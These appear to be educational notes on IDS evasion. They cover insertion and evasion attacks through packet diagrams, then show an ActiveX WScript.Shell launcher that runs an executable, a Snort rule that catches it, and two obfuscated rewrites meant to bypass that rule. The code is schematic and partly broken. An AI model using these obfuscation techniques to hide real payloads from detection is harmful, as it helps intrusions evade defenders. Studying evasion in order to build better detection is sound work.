*Can detection be defeated?*
--

- Insertion
	- IDS accepts the packets that destination rejects
- Evasion
	- Destination host accepts a packet that IDS rejects 
- Denial of Service 
	- IDS is overwhelmed with traffic and unable to analyze new packets


## *Insertion Attack* 

```
# sending a packet with `got` with good values

|IDS|      ->  |Destination|

MESSAGE
VALUE=Got  ->  Got ✓

# sending a packet with `Hi` with bad checksum 
# gets rejected from the destination due to bad checksum

|IDS|        ->  |Destination|

MESSAGE
VALUE=Hi     ->  Hi ✘
CHECKSUM=bad

# sending a packet with `cha!` with good values

|IDS|      ->  |Destination|

MESSAGE
VALUE=cha  ->  cha! ✓

----

IDS sees: GotHicha!  
Destination sees: Gotcha! (attack successful)
```


## *Evasion Attack* 

```
# sending a overlaping packet with the value `Got` 
# since its overlaping IDS will ignore this 

|IDS|✘       ->  |Destination|

MESSAGE
VALUE=Got ✘  ->  Got ✓

# sending a packet with `cha!` with good values

|IDS|      ->  |Destination|

MESSAGE
VALUE=cha  ->  cha! ✓

----

IDS sees: chat!
Destination sees: Gotcha! (attack successful)
```

## *String Obfuscation*

so our exploit it shown below

```ts
const launcher = new ActiveXObject("wsript.shell")
launcher.run("C:\exploit.exe")
```

if there's a IDS rule like  (snort rule below)

```js
alert tcp any any -> any 80 (content:"wsript.shell";content: ".Run|22|exploit.exe";distance:0; within 100; msg: "exploit.exe was executed using javascript";))
```

see here we will get detected by the IDS so we can string obfusate this to bypass the snort rule

```ts
const a = "script";
const b = "shell";
const c = "w";

const d = "ex";
const f = "ploi";
const g = "t";
const h = "e";
const i = "c"
const j = ":/"

const launcher = new ActiveXObject(c + a + "." + b);

launcher.run(i+ j + d + f + t + "." + d + e);
```

or even more like shown below

```js
const _0x3407e5='script',_0x49d2d4='shell',_0x1594af='w',_0x9728d2='ex',_0x361b86='ploi',_0x5b3b23='t',_0x2980ce='e',_0x26f05e='c',_0x35e909=':/',_0x19633b=new ActiveXObject(_0x1594af+_0x3407e5+'.'+_0x49d2d4);_0x19633b['run'](_0x26f05e+_0x35e909+_0x9728d2+_0x361b86+t+'.'+_0x9728d2+e);
```



